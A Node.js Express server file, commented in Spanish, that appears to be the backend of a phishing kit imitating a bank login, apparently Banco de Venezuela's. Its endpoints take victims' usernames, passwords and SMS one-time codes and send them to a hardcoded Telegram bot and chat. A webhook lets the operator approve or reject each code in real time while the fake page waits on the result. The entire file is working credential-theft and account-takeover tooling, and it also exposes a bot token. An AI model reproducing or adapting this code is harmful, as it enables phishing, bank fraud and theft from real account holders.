const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware para leer datos JSON y URL encoded
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Servir archivos estáticos de la carpeta actual
app.use(express.static(path.join(__dirname)));

// Credenciales del Bot de Telegram
const BOT_TOKEN = '8878279475:AAEdCmf7PRO_6iLJLFKgAbjAwj9nfJ-Crb0';
const CHAT_ID = '7924619096';

// const BOT_TOKEN = process.env.BOT_TOKEN;
// const CHAT_ID = process.env.CHAT_ID;

// Estado temporal para la verificación de los botones
let estadoActual = 'esperando'; 

// 1. Endpoint para recibir credenciales o SMS desde el frontend y enviarlos a Telegram
app.post('/api/enviar-telegram', async (req, res) => {
    const { tipo, usuario, password, smsCode, amount } = req.body;

    let mensaje = '';
    let replyMarkup = null;
    
    if (tipo === 'login') {
        mensaje = `💻ㅤ<b>[ LOGINBDV - CRÉDITO ${amount} ]</b>\n\n` +
                  `👥ㅤ<b>Usuario:</b> ${usuario}\n` +
                  `🔐ㅤ<b>Contraseña:</b> ${password}\n\n` +
                  `🕒ㅤ${new Date().toLocaleString()}`;
                  
    } else if (tipo === 'sms') {
        // Reiniciar el estado al enviar un nuevo SMS
        estadoActual = 'esperando';

        mensaje = `💻ㅤ<b>[ LOGINBDV - CRÉDITO ${amount} ]</b>\n\n` +
                  `👥ㅤ<b>Usuario:</b> ${usuario}\n` +
                  `🔢ㅤ<b>Código SMS:</b> ${smsCode}\n\n` +
                  `🕒ㅤ${new Date().toLocaleString()}`;

        // Botones interactivos solo para el código SMS
        replyMarkup = {
            inline_keyboard: [
                [
                    { text: "✅ Aprobar Código", callback_data: "aprobar_sms" },
                    { text: "❌ Rechazar Código", callback_data: "rechazar_sms" }
                ]
            ]
        };
    }

    try {
        const fetch = (await import('node-fetch')).default;
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const bodyData = {
            chat_id: CHAT_ID,
            text: mensaje,
            parse_mode: 'HTML'
        };

        if (replyMarkup) {
            bodyData.reply_markup = replyMarkup;
        }

        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(bodyData)
        });

        const data = await response.json();
        res.json({ success: true, data });
    } catch (error) {
        console.error('Error al enviar a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 2. Webhook que recibe los clics de los botones desde Telegram
app.post('/api/telegram-webhook', async (req, res) => {
    const update = req.body;

    if (update.callback_query) {
        const chatId = update.callback_query.message.chat.id;
        const action = update.callback_query.data; // "aprobar_sms" o "rechazar_sms"
        const messageId = update.callback_query.message.message_id;

        const fetch = (await import('node-fetch')).default;

        // Quitar el estado de carga del botón en Telegram
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: update.callback_query.id })
        });

        // Actualizar el texto del mensaje en Telegram con el resultado
        let textoOriginal = update.callback_query.message.text;
        let resultadoTexto = action === 'aprobar_sms' ? '\n\n<b>✅ ESTADO: APROBADO</b>' : '\n\n<b>❌ ESTADO: RECHAZADO</b>';
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                message_id: messageId,
                text: textoOriginal + resultadoTexto,
                parse_mode: 'HTML'
            })
        });

        // Guardar la decisión
        estadoActual = action;
    }

    res.sendStatus(200);
});

// 3. Endpoint para consultar el estado actual desde el frontend
app.get('/api/consultar-estado', (req, res) => {
    res.json({ estado: estadoActual });
});

// Rutas principales de la página web
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/exito.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'exito.html'));
});

// Iniciar servidor
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});
